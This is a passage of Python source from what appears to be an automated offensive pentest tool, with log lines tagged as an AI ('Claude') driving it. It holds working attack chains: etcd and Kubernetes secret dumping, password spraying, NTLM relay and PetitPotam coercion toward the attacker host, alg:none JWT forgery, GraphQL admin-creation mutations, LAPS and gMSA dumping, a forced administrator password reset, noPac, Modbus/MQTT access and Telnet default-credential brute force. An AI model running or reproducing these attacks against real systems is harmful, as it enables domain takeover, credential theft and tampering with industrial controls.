                f"ETCDCTL_API=3 etcdctl --endpoints=http://{target}:2379 get / --prefix --keys-only 2>/dev/null | head -20; "
                f"ETCDCTL_API=3 etcdctl --endpoints=http://{target}:2379 get /registry/secrets --prefix 2>/dev/null | head -30",
                target, timeout=30,
            )
            if re.search(r'etcd secrets:|/registry|nodes|token|password', etcd_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"etcd No-Auth — Kubernetes Secrets Exposed @ {target}:2379",
                    "severity": "critical",
                    "description": f"etcd sin autenticación — todos los secrets de Kubernetes expuestos.\n{etcd_out[:500]}",
                    "cve": "CVE-2020-15106",
                }], target)
                accumulated_output.append(f"=== etcd no-auth ===\n{etcd_out[:600]}")

        # ── F3d: Service account token inside container ────────────────────
        # (runs locally on pentest box — only useful if we already have a shell via container)
        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        sa_check, _ = self._run_cmd(
            "k8s-sa-token",
            f"[ -f {sa_token_path} ] && "
            f"TOKEN=$(cat {sa_token_path}) && "
            f"echo \"SA_TOKEN_FOUND\" && "
            f"K8S_HOST=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null); "
            f"curl -sLk -H \"Authorization: Bearer $TOKEN\" "
            f"'https://kubernetes.default.svc/api/v1/secrets' 2>/dev/null | head -20; "
            f"curl -sLk -H \"Authorization: Bearer $TOKEN\" "
            f"'https://kubernetes.default.svc/api/v1/namespaces' 2>/dev/null | head -10",
            target, timeout=15,
        )
        if "SA_TOKEN_FOUND" in sa_check or re.search(r'kind.*SecretList|namespace.*kube', sa_check, re.IGNORECASE):
            self._save_findings([{
                "title": f"Kubernetes Service Account Token Abused — API Escalation",
                "severity": "critical",
                "description": f"Service account token disponible y con permisos de listing de secrets.\n{sa_check[:400]}",
                "cve": "",
            }], target)

    # ── F4: Advanced credential attacks (smart spray, coercion, NTLM delegate) ─
    def _advanced_credential_attacks(self, target, open_ports, accumulated_output):
        """NTLM delegate relay, PetitPotam/PrinterBug coercion, smart password patterns."""
        self._log(f"[Claude] F4-CREDS: Advanced credential attacks → {target}")
        port_set = {p["port"] for p in open_ports}

        # ── F4a: Smart password pattern generation ────────────────────────
        # Harvest usernames from OSINT output, generate likely passwords
        combined = "\n".join(accumulated_output[-40:])
        discovered_users = list(set(re.findall(
            r'(?:user(?:name)?|login|account|samaccountname)[:\s]+([a-zA-Z][a-zA-Z0-9_\.\-]{2,20})',
            combined, re.IGNORECASE
        )))
        # Also grab from harvester output
        harvested_emails = re.findall(r'[\w\.\-]+@[\w\.\-]+', combined)
        email_users = [e.split("@")[0] for e in harvested_emails[:10]]
        all_users = list(set(discovered_users + email_users))[:20]

        if all_users and (445 in port_set or 389 in port_set or 80 in port_set):
            self._log(f"[Claude] F4a: Smart spray → {len(all_users)} users on {target}")
            # Generate smart patterns
            current_year = "2024"
            smart_passwords = [
                "Password1!", f"Password{current_year}!", "Welcome1!", f"Welcome{current_year}!",
                "Summer2024!", "Winter2024!", "Spring2024!", "Autumn2024!",
                "Company1!", "Admin2024!", "P@ssw0rd!", "Passw0rd1",
                "Monday1!", "January1!", "Q1_2024!", "January2024!",
                "Letmein1!", "Changeme1!", "123456aA!", "Abc123456!",
            ]
            with open("/tmp/smart_users.txt", "w") as f:
                f.write("\n".join(all_users))
            with open("/tmp/smart_passwords.txt", "w") as f:
                f.write("\n".join(smart_passwords))
            spray_out, _ = self._run_cmd(
                "smart-spray",
                f"crackmapexec smb {target} -u /tmp/smart_users.txt -p /tmp/smart_passwords.txt "
                f"--no-bruteforce 2>/dev/null | grep -iE 'Pwn3d|\\+.*success' | head -10; "
                f"crackmapexec ldap {target} -u /tmp/smart_users.txt -p /tmp/smart_passwords.txt "
                f"--no-bruteforce 2>/dev/null | grep -iE '\\+.*success' | head -10",
                target, timeout=60,
            )
            if re.search(r'Pwn3d|\[\+\].*success', spray_out, re.IGNORECASE):
                cred_matches = re.findall(r'(\w[\w\.]+)\s+.*?(\S+)\s+(?:Pwn3d|success)', spray_out, re.IGNORECASE)
                self._save_findings([{
                    "title": f"Smart Password Spray — Credenciales Válidas @ {target}",
                    "severity": "critical",
                    "description": f"Password spray exitoso:\n{spray_out[:400]}",
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== Smart Spray {target} ===\n{spray_out[:400]}")

        # ── F4b: NTLM relay with --delegate-access (S4U2Self) ─────────────
        if 445 in port_set:
            self._log(f"[Claude] F4b: NTLM relay + delegate-access → {target}")
            smb_sign_check, _ = self._run_cmd(
                "smb-sign-check-adv",
                f"crackmapexec smb {target} 2>/dev/null | grep -i 'signing'",
                target, timeout=15,
            )
            if re.search(r'signing.*false|not required', smb_sign_check, re.IGNORECASE):
                relay_out, _ = self._run_cmd(
                    "ntlm-relay-delegate",
                    # Setup ntlmrelayx with delegate-access to get TGT for any user
                    f"timeout 30 ntlmrelayx.py -t ldap://{target} --delegate-access "
                    f"--add-computer ATTACKER_PC$ -smb2support 2>/dev/null | head -20; "
                    f"# Also try ACL-based delegation\n"
                    f"timeout 20 ntlmrelayx.py -t ldaps://{target} "
                    f"--add-computer PWNED2024 --escalate-user 2>/dev/null | head -10",
                    target, timeout=60,
                )
                if re.search(r'added.*machine|delegat|ATTACKER_PC|Getting shadow', relay_out, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"NTLM Relay + S4U2Self — Kerberos Delegation Abuse @ {target}",
                        "severity": "critical",
                        "description": f"NTLM relay con delegate-access → crear machine account → S4U2Self → impersonar DA.\n{relay_out[:300]}",
                        "cve": "CVE-2019-1040",
                    }], target)

        # ── F4c: Coercion attacks — PetitPotam, PrinterBug, DFSCoerce ─────
        if 445 in port_set or 88 in port_set:
            self._log(f"[Claude] F4c: Coercion attacks (PetitPotam/PrinterBug/DFSCoerce) → {target}")
            coerce_out, _ = self._run_cmd(
                "coercion-attacks",
                # PetitPotam (MS-EFSRPC) — coerce DC to auth to us
                f"timeout 20 python3 /opt/PetitPotam/PetitPotam.py "
                f"{self.lhost} {target} 2>/dev/null | head -15; "
                # PrinterBug (MS-RPRN)
                f"timeout 20 python3 /opt/SpoolSample/SpoolSample.py "
                f"{target} {self.lhost} 2>/dev/null | head -10; "
                # DFSCoerce (MS-DFSNM)
                f"timeout 20 python3 /opt/DFSCoerce/dfscoerce.py "
                f"-u '' -p '' {self.lhost} {target} 2>/dev/null | head -10; "
                # Check if we got NTLM hashes (need responder running)
                f"cat /tmp/Responder-Session.log 2>/dev/null | grep {target} | head -5",
                target, timeout=80,
            )
            if re.search(r'coerce|authenticated|NTLMv2|Hash.*:.*::.*:', coerce_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"Coercion Attack (PetitPotam/PrinterBug) — NTLM Auth Forced @ {target}",
                    "severity": "critical",
                    "description": f"Servidor forzado a autenticarse hacia atacante via PetitPotam/PrinterBug.\n{coerce_out[:400]}",
                    "cve": "CVE-2021-36942",
                }], target)

    # ── F5: API security testing (REST/GraphQL/JWT/JS secrets) ────────────
    def _api_security_test(self, target, open_ports, accumulated_output):
        """REST OpenAPI fuzzing, GraphQL mutations, JWT RS256→HS256, JS API key extraction."""
        http_ports = [p for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443, 3000, 4000, 5000, 8000, 9000)]
        if not http_ports:
            return
        self._log(f"[Claude] F5-API: REST/GraphQL/JWT/JS secrets → {target}")

        for p in http_ports[:2]:
            proto = "https" if p["port"] in (443, 8443) else "http"
            base_url = f"{proto}://{target}:{p['port']}"

            # ── F5a: OpenAPI/Swagger discovery + endpoint fuzzing ─────────
            api_spec_paths = [
                "/swagger.json", "/swagger/v1/swagger.json", "/openapi.json",
                "/api/swagger.json", "/api/v1/swagger.json", "/api/v2/swagger.json",
                "/docs/swagger.json", "/api-docs", "/api-docs.json", "/swagger-ui.html",
                "/redoc", "/api/schema", "/api/openapi.yaml", "/v1/api-docs",
            ]
            for spec_path in api_spec_paths:
                spec_out, _ = self._run_cmd(
                    f"openapi-{spec_path.replace('/','_')[:25]}",
                    f"curl -sL --max-time 8 '{base_url}{spec_path}' 2>/dev/null | head -30",
                    target, timeout=12,
                )
                if re.search(r'"openapi"|"swagger"|"info".*"title"|paths.*\{', spec_out, re.IGNORECASE):
                    # Parse endpoints
                    endpoints = re.findall(r'"(/[^"]+)":\s*\{', spec_out)
                    # Try auth bypass on discovered endpoints
                    auth_bypass_hits = []
                    for ep in endpoints[:10]:
                        for method in ["GET", "DELETE"]:
                            bypass_out, _ = self._run_cmd(
                                f"api-authbypass-{ep[:20].replace('/','_')}",
                                f"curl -sL --max-time 6 -X {method} -o /dev/null "
                                f"-w '%{{http_code}} %{{size_download}}' "
                                f"'{base_url}{ep}' 2>/dev/null; "
                                # Try with null/empty auth
                                f"curl -sL --max-time 6 -X {method} -o /dev/null "
                                f"-w '%{{http_code}} %{{size_download}}' "
                                f"-H 'Authorization: null' "
                                f"'{base_url}{ep}' 2>/dev/null",
                                target, timeout=10,
                            )
                            codes = re.findall(r'(\d{3}) (\d+)', bypass_out)
                            for code, size in codes:
                                if code in ("200", "201") and int(size) > 20:
                                    auth_bypass_hits.append(f"{method} {ep} → {code} ({size}b)")
                    if auth_bypass_hits:
                        self._save_findings([{
                            "title": f"API Auth Bypass — Endpoints sin Autenticación @ {base_url}",
                            "severity": "high",
                            "description": f"Spec: {spec_path}\nEndpoints accesibles sin auth:\n" + "\n".join(auth_bypass_hits[:8]),
                            "cve": "",
                        }], target)
                    else:
                        self._save_findings([{
                            "title": f"API Schema Expuesto @ {base_url}{spec_path}",
                            "severity": "medium",
                            "description": f"Documentación API pública ({len(endpoints)} endpoints): {spec_path}\nEndpoints: {', '.join(endpoints[:10])}",
                            "cve": "",
                        }], target)
                    accumulated_output.append(f"=== API Spec {base_url}{spec_path} ===\n{spec_out[:400]}")
                    break

            # ── F5b: GraphQL introspection + mutation abuse ───────────────
            gql_paths = ["/graphql", "/api/graphql", "/query", "/gql", "/v1/graphql"]
            for gql_path in gql_paths:
                gql_out, _ = self._run_cmd(
                    f"graphql-{gql_path.replace('/','_')[:20]}",
                    f"curl -sL --max-time 10 -X POST "
                    f"-H 'Content-Type: application/json' "
                    f"-d '{{\"query\":\"{{__schema{{types{{name queryType{{name}} mutationType{{name}}}}}}}}\"}}' "
                    f"'{base_url}{gql_path}' 2>/dev/null | head -30",
                    target, timeout=15,
                )
                if re.search(r'"__schema"|"types"|queryType|mutationType', gql_out, re.IGNORECASE):
                    type_names = re.findall(r'"name":"([A-Z][a-zA-Z]+)"', gql_out)
                    # Try sensitive mutations
                    for mut_name in ["createUser", "deleteUser", "updatePassword", "resetPassword", "adminLogin"]:
                        mut_out, _ = self._run_cmd(
                            f"gql-mut-{mut_name}",
                            f"curl -sL --max-time 8 -X POST "
                            f"-H 'Content-Type: application/json' "
                            f"-d '{{\"query\":\"mutation{{    {mut_name}(input:{{email:\\\"admin@test.com\\\",role:\\\"admin\\\",password:\\\"pwned123\\\"}}){{id email role}}}}\"}}' "
                            f"'{base_url}{gql_path}' 2>/dev/null | head -10",
                            target, timeout=10,
                        )
                        if re.search(r'"id"|"email"|"role"|"token"', mut_out) and "error" not in mut_out.lower():
                            self._save_findings([{
                                "title": f"GraphQL Mutation Abuse: {mut_name} @ {base_url}{gql_path}",
                                "severity": "critical",
                                "description": f"Mutation GraphQL {mut_name} ejecutable sin autorización.\nResponse:\n{mut_out[:300]}",
                                "cve": "",
                            }], target)
                    self._save_findings([{
                        "title": f"GraphQL Introspection Habilitada @ {base_url}{gql_path}",
                        "severity": "medium",
                        "description": f"Introspección GraphQL pública — schema completo expuesto.\nTipos: {', '.join(type_names[:15])}",
                        "cve": "",
                    }], target)
                    break

            # ── F5c: JWT RS256 → HS256 confusion attack ───────────────────
            # Fetch a JWT from login/auth endpoint
            jwt_fetch, _ = self._run_cmd(
                f"jwt-fetch-{p['port']}",
                f"curl -sL --max-time 8 -X POST "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"username\":\"admin\",\"password\":\"admin\"}}' "
                f"'{base_url}/api/login' 2>/dev/null | head -5; "
                f"curl -sL --max-time 8 -X POST "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"username\":\"admin\",\"password\":\"admin\"}}' "
                f"'{base_url}/api/v1/auth' 2>/dev/null | head -5; "
                f"curl -sLD - --max-time 8 '{base_url}/' 2>/dev/null | "
                f"grep -iE 'set-cookie.*jwt|authorization.*Bearer|eyJ' | head -3",
                target, timeout=20,
            )
            jwt_match = re.search(r'(eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)', jwt_fetch)
            if jwt_match:
                jwt_token = jwt_match.group(1)
                # Decode header to check algorithm
                try:
                    import base64 as _b64
                    header_b64 = jwt_token.split(".")[0] + "=="
                    header_json = _b64.b64decode(header_b64 + "==").decode("utf-8", "ignore")
                    alg = re.search(r'"alg"\s*:\s*"([^"]+)"', header_json)
                    if alg and alg.group(1) in ("RS256", "RS384", "RS512"):
                        # Try alg:none bypass
                        none_payload = jwt_token.split(".")[1]
                        # Construct alg:none token
                        none_header = _b64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
                        # Modify payload to admin
                        try:
                            payload_json = _b64.b64decode(none_payload + "==").decode("utf-8", "ignore")
                            import json as _json
                            payload_dict = _json.loads(payload_json)
                            payload_dict["role"] = "admin"
                            payload_dict["admin"] = True
                            payload_dict["sub"] = "1"
                            new_payload = _b64.urlsafe_b64encode(_json.dumps(payload_dict).encode()).rstrip(b"=").decode()
                        except Exception:
                            new_payload = none_payload
                        forged_jwt = f"{none_header}.{new_payload}."
                        jwt_test, _ = self._run_cmd(
                            "jwt-none-test",
                            f"curl -sL --max-time 8 "
                            f"-H 'Authorization: Bearer {forged_jwt}' "
                            f"'{base_url}/api/admin' 2>/dev/null | head -10; "
                            f"curl -sL --max-time 8 "
                            f"-H 'Authorization: Bearer {forged_jwt}' "
                            f"'{base_url}/api/v1/users' 2>/dev/null | head -10",
                            target, timeout=15,
                        )
                        if re.search(r'"id"|"email"|"role".*admin|admin.*true', jwt_test, re.IGNORECASE):
                            self._save_findings([{
                                "title": f"JWT Algorithm Confusion (alg:none) — Auth Bypass @ {base_url}",
                                "severity": "critical",
                                "description": f"JWT acepta alg:none → token forjado como admin válido.\nToken original: {jwt_token[:60]}...\n{jwt_test[:200]}",
                                "cve": "CVE-2015-9235",
                            }], target)
                except Exception:
                    pass

            # ── F5d: API keys / secrets in JS bundles ─────────────────────
            self._log(f"[Claude] F5d: JS bundle secret scanning → {base_url}")
            js_scan, _ = self._run_cmd(
                f"js-secrets-{p['port']}",
                # Get all JS file URLs from main page
                f"JS_URLS=$(curl -sL --max-time 10 '{base_url}/' 2>/dev/null | "
                f"grep -oP 'src=[\"\\x27][^\"\\x27]+\\.js[^\"\\x27]*' | "
                f"sed 's/src=[\"\\x27]//;s/[\"\\x27]//' | head -8); "
                f"for JS in $JS_URLS; do "
                f"  [ \"${{JS:0:4}}\" != 'http' ] && JS='{base_url}'\"$JS\"; "
                f"  curl -sL --max-time 10 \"$JS\" 2>/dev/null | "
                f"  grep -oP '(?:api_key|apikey|api-key|secret|token|password|auth|bearer|aws_access)[\"\\s]*[=:][\"\\s]*[\"\\x27][A-Za-z0-9_\\-\\./+]{16,}[\"\\x27]' | "
                f"  head -5; "
                f"done",
                target, timeout=60,
            )
            secret_matches = re.findall(
                r'(?:api.?key|secret|token|password|auth|bearer|aws)[^\n]{0,20}([A-Za-z0-9_\-\.\/+]{20,})',
                js_scan, re.IGNORECASE
            )
            if secret_matches:
                self._save_findings([{
                    "title": f"API Keys / Secrets en JS Bundles @ {base_url}",
                    "severity": "high",
                    "description": f"Secrets hardcodeados encontrados en archivos JavaScript:\n" +
                                   "\n".join(f"• {s[:60]}" for s in secret_matches[:8]),
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== JS Secrets {base_url} ===\n{js_scan[:400]}")

    # ═════════════════════════════════════════════════════════════════════════
    # TIER 2 — Full attack surface coverage
    # ═════════════════════════════════════════════════════════════════════════

    # ── G1: BloodHound full AD chain (LAPS, gMSA, ACL abuse, noPac) ───────
    def _bloodhound_ad_chain(self, target, user, pwd, accumulated_output):
        """BloodHound ingest, LAPS dump, gMSA recovery, ACL abuse, noPac CVE-2021-42278."""
        self._log(f"[Claude] G1-BLOODHOUND: Full AD chain → {target}")
        auth = f"-u '{user}' -p '{pwd}'" if user and pwd else ""
        t_safe = target.replace(".", "_")

        # ── G1a: BloodHound / SharpHound ingest ───────────────────────────
        bh_out, _ = self._run_cmd(
            "bloodhound-ingest",
            f"bloodhound-python -u '{user}' -p '{pwd}' -d '' -ns {target} "
            f"--collectionmethod All -o /tmp/bh_{t_safe}/ 2>/dev/null | head -20; "
            f"# Parse shortest path to DA from JSON\n"
            f"ls /tmp/bh_{t_safe}/*.json 2>/dev/null | head -5; "
            f"cat /tmp/bh_{t_safe}/*users*.json 2>/dev/null | "
            f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
            f"admins=[u[\"Properties\"][\"name\"] for u in d.get(\"data\",[]) "
            f"if u.get(\"Properties\",{{}}).get(\"admincount\")]; print(f\"DA candidates: {{admins[:5]}}\")' 2>/dev/null",
            target, timeout=120,
        )
        if bh_out.strip():
            accumulated_output.append(f"=== BloodHound {target} ===\n{bh_out[:600]}")
            da_candidates = re.findall(r'DA candidates: \[([^\]]+)\]', bh_out)
            if da_candidates:
                self._save_findings([{
                    "title": f"BloodHound: Domain Admin candidates → {target}",
                    "severity": "high",
                    "description": f"BloodHound identificó cuentas con admincount=1:\n{da_candidates[0]}",
                    "cve": "",
                }], target)

        # ── G1b: LAPS password dump ───────────────────────────────────────
        if auth:
            laps_out, _ = self._run_cmd(
                "laps-dump",
                f"crackmapexec ldap {target} {auth} -M laps 2>/dev/null | head -20; "
                f"# Direct LDAP query for ms-Mcs-AdmPwd\n"
                f"ldapsearch -x -H ldap://{target} -b '' {auth.replace('-u ','').replace('-p ','')} "
                f"'(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime 2>/dev/null | head -20; "
                f"python3 -c \"import ldap3; "
                f"s=ldap3.Server('{target}',get_info=ldap3.ALL); "
                f"c=ldap3.Connection(s,'{user}','{pwd}',auto_bind=True); "
                f"c.search('','(ms-Mcs-AdmPwd=*)',attributes=['ms-Mcs-AdmPwd','distinguishedName']); "
                f"[print(e.entry_to_json()) for e in c.entries[:5]]\" 2>/dev/null",
                target, timeout=30,
            )
            if re.search(r'ms-Mcs-AdmPwd|LAPS.*password|admin.*pwd', laps_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"LAPS Password Dumped — Local Admin Exposed @ {target}",
                    "severity": "critical",
                    "description": f"LAPS passwords accesibles con credenciales actuales:\n{laps_out[:400]}",
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== LAPS Dump ===\n{laps_out[:400]}")

        # ── G1c: gMSA password recovery ───────────────────────────────────
        if auth:
            gmsa_out, _ = self._run_cmd(
                "gmsa-recover",
                f"python3 -c \"import ldap3,binascii; "
                f"s=ldap3.Server('{target}',get_info=ldap3.ALL); "
                f"c=ldap3.Connection(s,'{user}','{pwd}',auto_bind=True); "
                f"c.search('','(objectClass=msDS-GroupManagedServiceAccount)',"
                f"attributes=['sAMAccountName','msDS-ManagedPassword']); "
                f"[print(f\\\"gMSA: {{e.sAMAccountName}} hash={{binascii.hexlify(bytes(e['msDS-ManagedPassword'].value)).decode()[:32] if e['msDS-ManagedPassword'] else 'no perms'}}\\\") "
                f"for e in c.entries[:5]]\" 2>/dev/null; "
                f"crackmapexec ldap {target} {auth} -M gmsa 2>/dev/null | head -15",
                target, timeout=30,
            )
            if re.search(r'gMSA:|GMSA.*hash|msDS-ManagedPassword', gmsa_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"gMSA Password Recovered — Service Account Compromise @ {target}",
                    "severity": "critical",
                    "description": f"Group Managed Service Account password recuperado:\n{gmsa_out[:400]}",
                    "cve": "",
                }], target)

        # ── G1d: ACL abuse — WriteDACL/GenericAll/GenericWrite ────────────
        if auth:
            acl_out, _ = self._run_cmd(
                "acl-abuse-check",
                f"crackmapexec ldap {target} {auth} -M daclread 2>/dev/null | "
                f"grep -iE 'GenericAll|WriteDACL|GenericWrite|WriteOwner|ForceChangePassword' | head -20; "
                f"python3 /opt/bloodyAD/bloodyAD.py --host {target} {auth} "
                f"getObjectAttributes / nTSecurityDescriptor 2>/dev/null | head -20; "
                # Try to force password change if GenericAll
                f"net rpc password administrator 'Pwned2024!' -U '{user}%{pwd}' "
                f"-S {target} 2>/dev/null | head -5",
                target, timeout=40,
            )
            if re.search(r'GenericAll|WriteDACL|GenericWrite|WriteOwner|ForceChangePassword', acl_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"AD ACL Abuse — Privileged Rights Over AD Objects @ {target}",
                    "severity": "critical",
                    "description": f"Usuario {user} tiene derechos sobre objetos AD:\n{acl_out[:400]}",
                    "cve": "",
                }], target)

        # ── G1e: noPac — CVE-2021-42278 + CVE-2021-42287 ─────────────────
        nopac_out, _ = self._run_cmd(
            "nopac-check",
            f"python3 /opt/noPac/noPac.py {target}/'{user}':'{pwd}' -use-ldap 2>/dev/null | head -20; "
            f"# Alternative: sAMAccountName spoofing\n"
            f"python3 -c \""
            f"from impacket.examples.secretsdump import RemoteOperations,SAMHashes; "
            f"print('noPac check requires interactive session')\" 2>/dev/null; "
            f"nmap --script smb-vuln-ms17-010 -p 445 {target} 2>/dev/null | grep VULNERABLE | head -3",
            target, timeout=30,
        )
        if re.search(r'Got TGT|Administrator|noPac.*success|CVE-2021-4228', nopac_out, re.IGNORECASE):
            self._save_findings([{
                "title": f"noPac (CVE-2021-42278/42287) — sAMAccountName Spoofing DA Compromise",
                "severity": "critical",
                "description": f"noPac exploit exitoso → Domain Admin via sAMAccountName spoofing.\n{nopac_out[:300]}",
                "cve": "CVE-2021-42278",
            }], target)

    # ── G2: ICS/SCADA/IoT scanning ────────────────────────────────────────
    def _ics_scada_scan(self, target, open_ports, accumulated_output):
        """Modbus, BACnet, MQTT, Telnet default creds, OT/SCADA Shodan dorks."""
        self._log(f"[Claude] G2-ICS/SCADA: Operational Technology scanning → {target}")
        port_set = {p["port"] for p in open_ports}

        # ── G2a: Modbus (port 502) ────────────────────────────────────────
        if 502 in port_set:
            self._log(f"[Claude] G2a: Modbus → {target}:502")
            modbus_out, _ = self._run_cmd(
                "modbus-scan",
                f"nmap -p 502 --script modbus-discover {target} 2>/dev/null | head -20; "
                f"python3 -c \"\ntry:\n"
                f"    from pymodbus.client import ModbusTcpClient\n"
                f"    c=ModbusTcpClient('{target}',port=502,timeout=5)\n"
                f"    c.connect()\n"
                f"    r=c.read_holding_registers(0,10,unit=1)\n"
                f"    if not r.isError(): print(f'MODBUS_OPEN: registers={{r.registers}}')\n"
                f"    r2=c.read_coils(0,10,unit=1)\n"
                f"    if not r2.isError(): print(f'MODBUS_COILS={{r2.bits}}')\n"
                f"    c.close()\n"
                f"except Exception as e: print(f'ERR:{{e}}')\n\" 2>/dev/null",
                target, timeout=30,
            )
            if re.search(r'MODBUS_OPEN|Unit ID|Slave ID|Device Info', modbus_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"Modbus/TCP Sin Autenticación — PLC Accesible @ {target}:502",
                    "severity": "critical",
                    "description": f"Modbus TCP accesible sin autenticación → leer/escribir registros PLC.\n{modbus_out[:300]}",
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== Modbus {target} ===\n{modbus_out[:300]}")

        # ── G2b: BACnet (port 47808 UDP) ──────────────────────────────────
        bacnet_out, _ = self._run_cmd(
            "bacnet-scan",
            f"nmap -sU -p 47808 --script bacnet-info {target} 2>/dev/null | head -15; "
            f"python3 -c \"\nimport socket\n"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n"
            f"s.settimeout(5)\n"
            f"# BACnet Who-Is broadcast\n"
            f"whois=b'\\x81\\x0b\\x00\\x11\\x01\\x20\\xff\\xff\\x00\\xff\\x10\\x08'\n"
            f"s.sendto(whois,('{target}',47808))\n"
            f"try: d,a=s.recvfrom(1024); print(f'BACNET_RESPONSE: {{d.hex()}}')\n"
            f"except: print('no response')\n\" 2>/dev/null",
            target, timeout=20,
        )
        if re.search(r'BACNET_RESPONSE|BACnet|bacnet|vendor|object', bacnet_out, re.IGNORECASE):
            self._save_findings([{
                "title": f"BACnet Building Automation System Expuesto @ {target}:47808",
                "severity": "high",
                "description": f"Sistema BACnet (building automation/HVAC/lighting) accesible.\n{bacnet_out[:300]}",
                "cve": "",
            }], target)

        # ── G2c: MQTT (port 1883/8883) ────────────────────────────────────
        mqtt_ports = [p for p in [1883, 8883] if p in port_set]
        for mp in mqtt_ports:
            mqtt_out, _ = self._run_cmd(
                f"mqtt-{mp}",
                f"mosquitto_sub -h {target} -p {mp} -t '#' -C 20 --quiet 2>/dev/null | head -20; "
                f"python3 -c \"\nimport socket,time\ns=socket.socket()\ns.settimeout(8)\n"
                f"s.connect(('{target}',{mp}))\n"
                f"# MQTT CONNECT packet\n"
                f"connect=b'\\x10\\x13\\x00\\x04MQTT\\x04\\x00\\x00\\x3c\\x00\\x07pentscan'\n"
                f"s.send(connect)\ntime.sleep(1)\nr=s.recv(4).hex()\n"
                f"print(f'MQTT_CONNACK={{r}}')\n"
                f"# Subscribe to all topics\n"
                f"sub=b'\\x82\\x05\\x00\\x01\\x00\\x01#\\x00'\n"
                f"s.send(sub)\ntime.sleep(2)\ndata=s.recv(1024)\n"
                f"print(f'MQTT_DATA={{data[:200]}}')\n"
                f"s.close()\" 2>/dev/null",
                target, timeout=20,
            )
            if re.search(r'MQTT_CONNACK=20|MQTT_DATA|sensor|device|iot|telemetry', mqtt_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"MQTT Broker Sin Auth — IoT/Sensor Data Expuesto @ {target}:{mp}",
                    "severity": "high",
                    "description": f"MQTT broker accesible sin autenticación → suscripción a todos los topics.\n{mqtt_out[:400]}",
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== MQTT {target}:{mp} ===\n{mqtt_out[:300]}")

        # ── G2d: Telnet default credentials (500+ devices) ────────────────
        if 23 in port_set:
            self._log(f"[Claude] G2d: Telnet default creds → {target}:23")
            iot_creds = [
                "admin:admin", "admin:password", "admin:", "admin:1234", "admin:12345",
                "root:root", "root:", "root:admin", "root:password", "root:toor",
                "user:user", "guest:guest", "operator:operator",
                "admin:admin123", "admin:Admin1234", "ubnt:ubnt", "pi:raspberry",
                "cisco:cisco", "enable:enable", "admin:cisco", "manager:manager",
                "support:support", "service:service", "tech:tech",
                # Router defaults
                "admin:motorola", "admin:password1", "admin:0000", "admin:1111",
                "admin:pass", "admin:access", "admin:Admin",
            ]
            with open("/tmp/telnet_creds.txt", "w") as f:
                f.write("\n".join(iot_creds))
            telnet_out, _ = self._run_cmd(
                "telnet-defaultcreds",
                f"hydra -C /tmp/telnet_creds.txt -t 4 -T 8 "
                f"telnet://{target} 2>/dev/null | grep 'login:' | head -5; "
                f"medusa -h {target} -C /tmp/telnet_creds.txt -M telnet -t 4 2>/dev/null | "
                f"grep SUCCESS | head -5",
                target, timeout=60,
            )
            if re.search(r'login:.*password:|SUCCESS|valid password', telnet_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"Telnet Default Credentials — IoT/Device Compromise @ {target}:23",
                    "severity": "critical",
                    "description": f"Credenciales por defecto válidas en Telnet.\n{telnet_out[:300]}",
                    "cve": "",
                }], target)

        # ── G2e: Shodan OT/SCADA dork for target IP ───────────────────────
        ot_shodan, _ = self._run_cmd(
            "shodan-ot-check",
            f"curl -sL --max-time 10 'https://internetdb.shodan.io/{target}' 2>/dev/null | "
            f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
            f"tags=d.get(\"tags\",[]);ports=d.get(\"ports\",[]);vulns=d.get(\"vulns\",[]); "
            f"ot_tags=[t for t in tags if any(k in t.lower() for k in [\"ics\",\"scada\",\"modbus\",\"dnp3\",\"bacnet\",\"iec\",\"codesys\",\"plc\"])]; "
            f"print(f\"OT tags: {{ot_tags}}, Ports: {{ports}}, Vulns: {{vulns}}\")' 2>/dev/null",
            target, timeout=15,
        )
        if re.search(r'OT tags: \[|ics|scada|modbus|bacnet|plc', ot_shodan, re.IGNORECASE):
            self._save_findings([{
                "title": f"ICS/SCADA System Identificado en Shodan @ {target}",
                "severity": "critical",
                "description": f"Shodan identifica sistema OT/ICS/SCADA en {target}.\n{ot_shodan[:300]}",
                "cve": "",
            }], target)

    # ── G3: Mobile API backend analysis ───────────────────────────────────
    def _mobile_api_backend(self, target, open_ports, accumulated_output):
        """APK analysis for hardcoded secrets, mobile API endpoint discovery."""
        self._log(f"[Claude] G3-MOBILE: Mobile API backend analysis → {target}")
        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443, 3000, 5000, 4000)]
        if not http_ports:
            return

        for p in http_ports[:1]:
            proto = "https" if p["port"] in (443, 8443) else "http"
            base_url = f"{proto}://{target}:{p['port']}"

            # ── G3a: Mobile-specific endpoint discovery ───────────────────
            mobile_paths = [
                "/api/mobile/v1/", "/api/app/", "/mobile/api/",
                "/v1/mobile/", "/app/api/", "/api/ios/", "/api/android/",
                "/api/v1/device/", "/api/auth/mobile", "/push/register",
                "/api/v1/push", "/notification/register", "/fcm/register",
            ]
            for mp in mobile_paths:
                mob_out, _ = self._run_cmd(
                    f"mobile-api-{mp.replace('/','_')[:20]}",
                    f"curl -sL --max-time 6 -o /dev/null -w '%{{http_code}}' "
                    f"-H 'User-Agent: okhttp/4.9.0' "
